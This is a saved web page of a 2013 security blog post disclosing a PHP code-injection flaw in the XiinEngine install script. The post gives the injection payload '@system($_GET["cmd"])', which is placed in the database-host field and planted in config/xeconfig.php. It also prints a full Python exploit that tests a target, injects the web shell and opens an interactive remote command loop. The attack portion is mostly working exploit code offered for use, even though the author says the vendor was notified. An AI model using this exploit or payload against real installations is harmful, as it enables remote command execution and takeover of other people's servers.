<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US"><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>XiinEngine php code injection | TomsonSec</title>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok2v=1613a3a185/"},atok:"c2f92801b93be329f53894911606aec8",petok:"7ff6aba8d38bf3883940398a397a315769a14eeb-1419606303-1800",zone:"tomsonsec.com",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok2v=919620257c/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script><script type="text/javascript" src="XiinEngine%20php%20code%20injection%20%7C%20TomsonSec_files/cloudflare.js"></script><style type="text/css">.cf-hidden { display: none; } .cf-invisible { visibility: hidden; }</style><script data-module="cloudflare/rocket" id="cfjs_block_508a83b33a" onload="CloudFlare.__cfjs_block_508a83b33a_load()" onerror="CloudFlare.__cfjs_block_508a83b33a_error()" onreadystatechange="CloudFlare.__cfjs_block_508a83b33a_readystatechange()" type="text/javascript" src="XiinEngine%20php%20code%20injection%20%7C%20TomsonSec_files/rocket.js"></script>
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="http://tomsonsec.com/xmlrpc.php">
<!--[if lt IE 9]>
<script src="http://tomsonsec.com/wp-content/themes/twentytwelve/js/html5.js" type="text/javascript"></script>
<![endif]-->
<link rel="alternate" type="application/rss+xml" title="TomsonSec » Feed" href="http://tomsonsec.com/index.php/feed/">
<link rel="alternate" type="application/rss+xml" title="TomsonSec » Comments Feed" href="http://tomsonsec.com/index.php/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="TomsonSec » XiinEngine php code injection Comments Feed" href="http://tomsonsec.com/index.php/xiinengine-php-code-injection/feed/">
<link rel="stylesheet" id="twentytwelve-fonts-css" href="XiinEngine%20php%20code%20injection%20%7C%20TomsonSec_files/css.css" type="text/css" media="all">
<link rel="stylesheet" id="twentytwelve-style-css" href="XiinEngine%20php%20code%20injection%20%7C%20TomsonSec_files/A.css" type="text/css" media="all">
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentytwelve-ie-css'  href='http://tomsonsec.com/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
<![endif]-->
<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://tomsonsec.com/wp-includes/js/jquery/jquery.js,qver=1.11.1.pagespeed.jm.z9hb-Gxqf6.js"></script>
<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://tomsonsec.com/wp-includes/js/jquery/jquery-migrate.min.js,qver=1.2.1.pagespeed.jm.mhpNjdU8Wl.js"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://tomsonsec.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://tomsonsec.com/wp-includes/wlwmanifest.xml">
<link rel="prev" title="Simple Openbox menu.xml editor" href="http://tomsonsec.com/index.php/simple-openbox-menu-xml-editor/">
<link rel="next" title="Smart zip extraction in python" href="http://tomsonsec.com/index.php/smart-zip-extraction-in-python/">
<meta name="generator" content="WordPress 4.1">
<link rel="canonical" href="http://tomsonsec.com/index.php/xiinengine-php-code-injection/">
<link rel="shortlink" href="http://tomsonsec.com/?p=195">
 
<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shCore.js.pagespeed.jm.ErSeI76fhQ.js"></script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(2(){1 h=5;h.I=2(){2 n(c,a){4(1 d=0;d<c.9;d++)i[c[d]]=a}2 o(c){1 a=r.H("J"),d=3;a.K=c;a.M="L/t";a.G="t";a.u=a.v=2(){6(!d&&(!8.7||8.7=="F"||8.7=="z")){d=q;e[c]=q;a:{4(1 p y e)6(e[p]==3)B a;j&&5.C(k)}a.u=a.v=x;a.D.O(a)}};r.N.R(a)}1 f=Q,l=h.P(),i={},e={},j=3,k=x,b;5.T=2(c){k=c;j=q};4(b=0;b<f.9;b++){1 m=f[b].w?f[b]:f[b].S(/\\s+/),g=m.w();n(m,g)}4(b=0;b<l.9;b++)6(g=i[l[b].E.A]){e[g]=3;o(g)}}})();',56,56,'|var|function|false|for|SyntaxHighlighter|if|readyState|this|length|||||||||||||||||true|document||javascript|onload|onreadystatechange|pop|null|in|complete|brush|break|highlight|parentNode|params|loaded|language|createElement|autoloader|script|src|text|type|body|removeChild|findElements|arguments|appendChild|split|all'.split('|'),0,{}))
//]]></script>
<link type="text/css" rel="stylesheet" href="XiinEngine%20php%20code%20injection%20%7C%20TomsonSec_files/A_002.css">
 
<style type="text/css" id="custom-background-css">body.custom-background{background-color:#fff;background-image:url(http://tomsonsec.com/wp-content/uploads/2013/11/tweed_,402X.png.pagespeed.ce.ovGQxspg7h.png);background-repeat:repeat;background-position:top left;background-attachment:fixed}</style>
</head>
<body class="single single-post postid-195 single-format-standard custom-background full-width custom-font-enabled single-author">
<div id="page" class="hfeed site">
<header id="masthead" class="site-header" role="banner">
<hgroup>
<h1 class="site-title"><a href="http://tomsonsec.com/" title="TomsonSec" rel="home">TomsonSec</a></h1>
<h2 class="site-description">Computer security and more</h2>
</hgroup>
<nav id="site-navigation" class="main-navigation" role="navigation">
<h3 class="menu-toggle">Menu</h3>
<a class="assistive-text" href="#content" title="Skip to content">Skip to content</a>
<div class="nav-menu"><ul><li><a href="http://tomsonsec.com/">Home</a></li><li class="page_item page-item-54"><a href="http://tomsonsec.com/index.php/54-2/">About</a></li><li class="page_item page-item-377"><a href="http://tomsonsec.com/index.php/practical-reverse-engineering/">Practical Reverse Engineering – solutions</a></li></ul></div>
</nav> 
</header> 
<div id="main" class="wrapper">
<div id="primary" class="site-content">
<div id="content" role="main">
<article id="post-195" class="post-195 post type-post status-publish format-standard hentry category-pentest tag-code-injection tag-install-script tag-xiinengine">
<header class="entry-header">
<h1 class="entry-title">XiinEngine php code injection</h1>
<div class="comments-link">
<a href="http://tomsonsec.com/index.php/xiinengine-php-code-injection/#respond" title="Comment on XiinEngine php code injection"><span class="leave-reply">Leave a reply</span></a> </div> 
</header> 
<div class="entry-content">
<p><a title="XiinEngine" href="https://github.com/GreenYoshi/xiinengine-legacy">xiinengine</a>&nbsp;install
 script dosn’t have any sanitizing when writing database config to 
config/xeconfig.php where it’s saved as followed:</p>
<div><div id="highlighter_896145" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php plain">define(</code><code class="php string">'XE_DB_HOST'</code><code class="php plain">, </code><code class="php string">'localhost'</code><code class="php plain">);</code></div><div class="line number2 index1 alt1"><code class="php plain">define(</code><code class="php string">'XE_DB_USER'</code><code class="php plain">, </code><code class="php string">'root'</code><code class="php plain">);</code></div><div class="line number3 index2 alt2"><code class="php plain">define(</code><code class="php string">'XE_DB_PASS'</code><code class="php plain">, </code><code class="php string">'a'</code><code class="php plain">);</code></div><div class="line number4 index3 alt1"><code class="php plain">define(</code><code class="php string">'XE_DB_NAME'</code><code class="php plain">, </code><code class="php string">'xe1'</code><code class="php plain">);</code></div></div></td></tr></tbody></table></div></div>
<p>So by simply giving&nbsp;<span style="color: #ff6600;">‘ . @system($_GET[“cmd”]) . ‘</span>&nbsp;as a post value will give us:</p>
<div><div id="highlighter_905742" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php plain">define(</code><code class="php string">'XE_DB_HOST'</code><code class="php plain">, </code><code class="php string">''</code> <code class="php plain">. @system(</code><code class="php variable">$_GET</code><code class="php plain">[</code><code class="php string">"cmd"</code><code class="php plain">]) . </code><code class="php string">''</code><code class="php plain">);</code></div></div></td></tr></tbody></table></div></div>
<p>We will successfully inject our shell into config/xeconfig.php.<br>
I’ve developed a working exploit just for fun:</p>
<div><div id="highlighter_206200" class="syntaxhighlighter  py"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="py comments">#<a href="https://github.com/GreenYoshi/xiinengine-legacy">https://github.com/GreenYoshi/xiinengine-legacy</a></code></div><div class="line number2 index1 alt1"><code class="py comments"># In install/step2.php post variables are saved without any</code></div><div class="line number3 index2 alt2"><code class="py comments">#sanitizing resulting in possible php command injection.</code></div><div class="line number4 index3 alt1"><code class="py comments">#For an example, post id="XE_DB_HOST" set value&nbsp; ' . @system($_GET["cmd"]) . '</code></div><div class="line number5 index4 alt2"><code class="py comments">#which will result in a shell at /config/xeconfig.php?cmd=ls</code></div><div class="line number6 index5 alt1"><code class="py comments">#Vendor are notified</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="py keyword">import</code> <code class="py plain">urllib,urllib2,sys</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="py keyword">if</code> <code class="py plain">(</code><code class="py functions">len</code> <code class="py plain">(sys.argv) &lt; </code><code class="py value">2</code><code class="py plain">):</code></div><div class="line number11 index10 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py string">"Usage: "</code> <code class="py keyword">+</code> <code class="py plain">sys.argv[</code><code class="py value">0</code><code class="py plain">] </code><code class="py keyword">+</code> <code class="py string">" url "</code> <code class="py keyword">+</code> <code class="py string">" -shell/-inject_shell/-inject\n"</code></div><div class="line number12 index11 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py string">"Example: "</code> <code class="py keyword">+</code> <code class="py plain">sys.argv[</code><code class="py value">0</code><code class="py plain">] </code><code class="py keyword">+</code> <code class="py string">" <a href="http://localhost/">http://localhost/</a> -inject_shell"</code></div><div class="line number13 index12 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">exit()</code></div><div class="line number14 index13 alt1">&nbsp;</div><div class="line number15 index14 alt2"><code class="py plain">url </code><code class="py keyword">=</code> <code class="py plain">sys.argv[</code><code class="py value">1</code><code class="py plain">]</code></div><div class="line number16 index15 alt1"><code class="py plain">header </code><code class="py keyword">=</code> <code class="py plain">{ </code><code class="py string">'User-Agent'</code> <code class="py plain">: </code><code class="py string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</code> <code class="py plain">}</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="py keyword">def</code> <code class="py plain">checkIfVuln():</code></div><div class="line number19 index18 alt2">&nbsp;</div><div class="line number20 index19 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">resp </code><code class="py keyword">=</code>&nbsp; <code class="py plain">urllib.urlopen(url</code><code class="py keyword">+</code><code class="py string">"config/xeconfig.php"</code><code class="py plain">)</code></div><div class="line number21 index20 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py plain">(resp.getcode()</code><code class="py keyword">=</code><code class="py keyword">=</code><code class="py value">200</code><code class="py plain">):</code></div><div class="line number22 index21 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">return</code> <code class="py value">1</code> <code class="py comments"># Not vuln</code></div><div class="line number23 index22 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">else</code><code class="py plain">:</code></div><div class="line number24 index23 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">return</code> <code class="py value">0</code> <code class="py comments"># Vulnerable</code></div><div class="line number25 index24 alt2">&nbsp;</div><div class="line number26 index25 alt1"><code class="py keyword">def</code> <code class="py plain">inject ():</code></div><div class="line number27 index26 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">post_values </code><code class="py keyword">=</code> <code class="py plain">{</code></div><div class="line number28 index27 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py string">'XE_DB_HOST'</code> <code class="py plain">: </code><code class="py string">'\' . @system($_GET[\"cmd\"]) . \''</code><code class="py plain">, </code><code class="py comments">#Payload</code></div><div class="line number29 index28 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py string">'action'</code> <code class="py plain">: </code><code class="py string">'Install'</code></div><div class="line number30 index29 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">}</code></div><div class="line number31 index30 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">encData </code><code class="py keyword">=</code> <code class="py plain">urllib.urlencode(post_values)</code></div><div class="line number32 index31 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">req </code><code class="py keyword">=</code> <code class="py plain">urllib2.Request(url</code><code class="py keyword">+</code><code class="py string">"install/index.php"</code><code class="py plain">,encData,header)</code></div><div class="line number33 index32 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">resp </code><code class="py keyword">=</code>&nbsp; <code class="py plain">urllib2.urlopen(req).read()</code></div><div class="line number34 index33 alt1">&nbsp;</div><div class="line number35 index34 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py plain">sys.argv[</code><code class="py value">1</code><code class="py plain">]</code><code class="py keyword">+</code><code class="py string">"/config/xeconfig.php injected"</code></div><div class="line number36 index35 alt1">&nbsp;</div><div class="line number37 index36 alt2"><code class="py keyword">def</code> <code class="py plain">shell ():</code></div><div class="line number38 index37 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">while</code> <code class="py value">1</code><code class="py plain">:</code></div><div class="line number39 index38 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">command </code><code class="py keyword">=</code> <code class="py functions">raw_input</code> <code class="py plain">(</code><code class="py string">"Command to run:"</code><code class="py plain">)</code></div><div class="line number40 index39 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">req </code><code class="py keyword">=</code> <code class="py plain">urllib2.Request(url</code><code class="py keyword">+</code><code class="py string">"config/xeconfig.php?cmd="</code><code class="py keyword">+</code><code class="py plain">command,</code><code class="py color1">None</code><code class="py plain">,header)</code></div><div class="line number41 index40 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">answ </code><code class="py keyword">=</code>&nbsp; <code class="py plain">urllib2.urlopen(req).read()</code></div><div class="line number42 index41 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py plain">answ</code></div><div class="line number43 index42 alt2">&nbsp;</div><div class="line number44 index43 alt1"><code class="py keyword">if</code><code class="py plain">(sys.argv[</code><code class="py value">2</code><code class="py plain">] </code><code class="py keyword">=</code><code class="py keyword">=</code> <code class="py string">"shell"</code><code class="py plain">):</code></div><div class="line number45 index44 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">shell()</code></div><div class="line number46 index45 alt1">&nbsp;</div><div class="line number47 index46 alt2"><code class="py keyword">elif</code><code class="py plain">(sys.argv[</code><code class="py value">2</code><code class="py plain">]</code><code class="py keyword">=</code><code class="py keyword">=</code> <code class="py string">"inject_shell"</code><code class="py plain">):</code></div><div class="line number48 index47 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py plain">(checkIfVuln()</code><code class="py keyword">=</code><code class="py keyword">=</code> <code class="py value">0</code><code class="py plain">):</code></div><div class="line number49 index48 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">inject()</code></div><div class="line number50 index49 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">else</code><code class="py plain">:</code></div><div class="line number51 index50 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py string">"Config file already exists, not vulnerable, or already exploited, entering shell mode."</code></div><div class="line number52 index51 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">shell()</code></div><div class="line number53 index52 alt2"><code class="py keyword">elif</code> <code class="py plain">(sys.argv[</code><code class="py value">2</code><code class="py plain">] </code><code class="py keyword">=</code><code class="py keyword">=</code> <code class="py string">"inject"</code><code class="py plain">):</code></div><div class="line number54 index53 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py plain">(checkIfVuln()</code><code class="py keyword">=</code><code class="py keyword">=</code> <code class="py value">0</code><code class="py plain">):</code></div><div class="line number55 index54 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">inject()</code></div><div class="line number56 index55 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">else</code><code class="py plain">:</code></div><div class="line number57 index56 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py string">"Config file already exists, not vulnerable"</code></div><div class="line number58 index57 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">exit()</code></div><div class="line number59 index58 alt2">&nbsp;</div><div class="line number60 index59 alt1"><code class="py keyword">else</code><code class="py plain">:</code></div><div class="line number61 index60 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code> <code class="py string">"Invalid arguments."</code></div><div class="line number62 index61 alt1">&nbsp;</div><div class="line number63 index62 alt2"><code class="py comments">"""</code></div><div class="line number64 index63 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">Complete list of postvalues in step1.php</code></div><div class="line number65 index64 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_SITE_NAME' : '',</code></div><div class="line number66 index65 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_SITE_DESCRIPTION' : '',</code></div><div class="line number67 index66 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_THEME_SLECT' : '',</code></div><div class="line number68 index67 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_ROOT_PASSWORD' : '',</code></div><div class="line number69 index68 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_ROOT_PASSWORD_CONFIRM' : '',</code></div><div class="line number70 index69 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_DB_HOST' : '\' . @system($_GET[\"cmd\"]) . \'', #Payload</code></div><div class="line number71 index70 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_DB_USER' : '',</code></div><div class="line number72 index71 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_DB_PASS' : '',</code></div><div class="line number73 index72 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_DB_NAME' : '',</code></div><div class="line number74 index73 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_PAGE_ABOUT' : '',</code></div><div class="line number75 index74 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'XE_PAGE_LEGAL' : '',</code></div><div class="line number76 index75 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments">'action' : 'Install'</code></div><div class="line number77 index76 alt2">&nbsp;</div><div class="line number78 index77 alt1"><code class="py comments">"""</code></div></div></td></tr></tbody></table></div></div>
<p>It’s also on <a href="https://github.com/Tomasuh/exploits/blob/master/xiinengine-legacy.py">github</a>.</p>
</div> 
<footer class="entry-meta">
This entry was posted in <a href="http://tomsonsec.com/index.php/category/pentest/" rel="category tag">pentest</a> and tagged <a href="http://tomsonsec.com/index.php/tag/code-injection/" rel="tag">code injection</a>, <a href="http://tomsonsec.com/index.php/tag/install-script/" rel="tag">install script</a>, <a href="http://tomsonsec.com/index.php/tag/xiinengine/" rel="tag">xiinengine</a> on <a href="http://tomsonsec.com/index.php/xiinengine-php-code-injection/" title="10:53 am" rel="bookmark"><time class="entry-date" datetime="2013-12-30T10:53:59+00:00">December 30, 2013</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="http://tomsonsec.com/index.php/author/tomasuh/" title="View all posts by Tomasuh" rel="author">Tomasuh</a></span></span>. </footer> 
</article> 
<nav class="nav-single">
<h3 class="assistive-text">Post navigation</h3>
<span class="nav-previous"><a href="http://tomsonsec.com/index.php/simple-openbox-menu-xml-editor/" rel="prev"><span class="meta-nav">←</span> Simple Openbox menu.xml editor</a></span>
<span class="nav-next"><a href="http://tomsonsec.com/index.php/smart-zip-extraction-in-python/" rel="next">Smart zip extraction in python <span class="meta-nav">→</span></a></span>
</nav> 
<div id="comments" class="comments-area">
<div id="respond" class="comment-respond">
<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://tomsonsec.com/index.php/xiinengine-php-code-injection/#respond" style="display:none;">Cancel reply</a></small></h3>
<form action="http://tomsonsec.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p> <p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" size="30" aria-required="true" type="text"></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" size="30" aria-describedby="email-notes" aria-required="true" type="text"></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" size="30" type="text"></p>
<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" aria-describedby="form-allowed-tags" aria-required="true"></textarea></p> <p class="form-allowed-tags" id="form-allowed-tags">You may use these <abbr title="HyperText Markup Language">HTML</abbr> tags and attributes: <code>&lt;a
 href="" title=""&gt; &lt;abbr title=""&gt; &lt;acronym title=""&gt; 
&lt;b&gt; &lt;blockquote cite=""&gt; &lt;cite&gt; &lt;code&gt; &lt;del 
datetime=""&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=""&gt; &lt;strike&gt; 
&lt;strong&gt; </code></p> <p class="form-submit">
<input name="submit" id="submit" class="submit" value="Post Comment" type="submit">
<input name="comment_post_ID" value="195" id="comment_post_ID" type="hidden">
<input name="comment_parent" id="comment_parent" value="0" type="hidden">
</p>
<p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" value="a44e569ef2" type="hidden"></p><p style="display: none;"></p> <input id="ak_js" name="ak_js" value="1419606304120" type="hidden"></form>
</div> 
</div> 
</div> 
</div> 
</div> 
<footer id="colophon" role="contentinfo">
<div class="site-info">
<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress</a>
</div> 
</footer> 
</div> 
 
<script data-rocketoptimized="true" type="text/rocketscript">SyntaxHighlighter.autoloader('applescript			http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushAppleScript.js','actionscript3 as3		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushAS3.js','bash shell				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushBash.js','coldfusion cf			http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushColdFusion.js','cpp c					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCpp.js','c# c-sharp csharp		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCSharp.js','css					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCss.js','delphi pascal pas		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushDelphi.js','diff patch			    http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushDiff.js','erl erlang				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushErlang.js','groovy					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushGroovy.js','java					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJava.js','jfx javafx				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJavaFX.js','js jscript javascript	http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJScript.js','perl pl				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPerl.js','php					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPhp.js','text plain				